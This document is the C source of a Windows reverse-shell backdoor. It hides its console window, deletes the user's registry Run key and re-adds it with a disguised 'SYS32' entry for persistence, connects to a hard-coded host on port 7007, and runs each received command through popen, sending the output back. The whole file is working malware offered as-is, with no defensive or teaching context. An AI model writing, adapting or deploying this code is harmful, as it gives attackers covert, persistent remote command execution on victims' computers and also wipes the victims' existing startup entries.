#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>
#include <unistd.h> 



#define bzero(buffer, size) memset(buffer, 0, size)


void Shell(int sock);
void persistence();
void hideWINDOW();
char *slice(char *ch, int from, int to);

int main(){

    hideWINDOW();
    persistence();

    struct sockaddr_in ServerAdd;
    unsigned short Port = 7007;
    char *ServerIP = "10.0.10.5";

    WSADATA wsa;
	
	if (WSAStartup(MAKEWORD(2,0), &wsa))
	{
		return 1;
	}
 
    int sock;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (!sock){
        printf("SOCKET ERROR!");
        return 1;
    }

    ServerAdd.sin_family = AF_INET;
    ServerAdd.sin_addr.s_addr = inet_addr(ServerIP);
    ServerAdd.sin_port = htons(Port);

    connect(sock, (struct sockaddr *) &ServerAdd, sizeof(ServerAdd));

    Shell(sock);

    return 0;
}







void persistence(){
    int delPER = system("reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /f");
    int addPER = system("reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /t REG_SZ /v SYS32 /d \%userprofile\%\\documents\\zdo\\backdoor\\c\\backdoor.exe");
}


void hideWINDOW(){
    HWND hide;
    AllocConsole();
    hide = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(hide, 0);
}



char *slice(char *ch, int from, int to){
    int diff = to-from;
    char *sliced = malloc(diff);
    int i;
    for (i=from; i<to; i++){
        *(sliced+i-from) = ch[i];
    }
    *(sliced+i-from) = '\0';
    return sliced;
}




void Shell(int sock){

    char RecvCMD[1024];
    char SendCMD[1048576];
    char container[1024];

    while(1){
        bzero(&RecvCMD, sizeof(RecvCMD));
        bzero(&SendCMD, sizeof(SendCMD));
        bzero(&container, sizeof(container));

        recv(sock, RecvCMD, sizeof(RecvCMD), 0);

        if (!strcmp(RecvCMD, "quit")){  
            WSACleanup();
            closesocket(sock);
            break;
        }

        if (!strcmp(slice(RecvCMD, 0, 3), "cd ")){
            int dir = chdir(slice(RecvCMD, 3, strlen(RecvCMD)));
            if (dir == -1){
                strcat(SendCMD, "\n[!] The system cannot find the path specified.\n");
            }
            else{
                strcat(SendCMD, "\n[+] Directory Changed.\n");
            }
        }

        else{
            FILE *fd;
            fd = popen(RecvCMD, "r");

            while (fgets(container, sizeof(container), fd)){
                strcat(SendCMD, container);
            }
            pclose(fd);
        }

        send(sock, SendCMD, sizeof(SendCMD), 0);
    }
}